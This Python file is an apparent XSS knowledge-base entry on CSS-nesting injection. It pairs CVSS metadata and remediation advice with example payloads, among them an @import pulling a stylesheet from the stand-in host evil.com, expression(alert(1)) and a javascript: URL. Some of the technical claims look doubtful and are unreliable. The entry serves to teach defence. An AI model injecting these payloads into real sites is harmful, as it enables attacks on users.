#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Knowledge Base: CSS Nesting XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via CSS Nesting",
    "severity": "medium",
    "cvss_score": 6.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "css", "nesting", "modern", "chrome-112"],
    "description": """
CSS Nesting (Chrome 112+) allows nesting CSS rules. XSS vulnerabilities occur when user input
controls nested CSS selectors or properties without validation.

SEVERITY: MEDIUM
Can lead to CSS injection and style-based attacks. Nested selectors can be used for CSS injection.
""",
    "attack_vector": """
CSS NESTING SELECTOR INJECTION:
.container {
  ${userInput} {  // XSS if selector is controlled
    color: red;
  }
}

CSS NESTING PROPERTY INJECTION:
.container {
  .child {
    ${userInput}: red;  // XSS if property is controlled
  }
}

CSS NESTING WITH @IMPORT:
.container {
  @import url('//evil.com/xss.css');
  .child { }
}

CSS NESTING WITH EXPRESSION:
.container {
  .child {
    background: expression(alert(1));  // IE only
  }
}

CSS NESTING WITH URL:
.container {
  .child {
    background: url('javascript:alert(1)');
  }
}
""",
    "remediation": """
DEFENSE:

1. Validate CSS selectors (alphanumeric, hyphens, underscores only)
2. Sanitize CSS properties
3. Block @import in user-controlled CSS
4. Block expression() and javascript: URLs
5. Implement CSP style-src

SAFE PATTERN:
function validateSelector(selector) {
  if (!/^[a-z0-9_-]+$/i.test(selector)) {
    throw new Error('Invalid selector');
  }
  return selector;
}
.container {
  ${validateSelector(userInput)} { }
}

CSS SANITIZATION:
import { sanitize } from 'css-sanitize';
const safeCSS = sanitize(userInput);
style.textContent = safeCSS;

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CSS Nesting Specification
""",
}
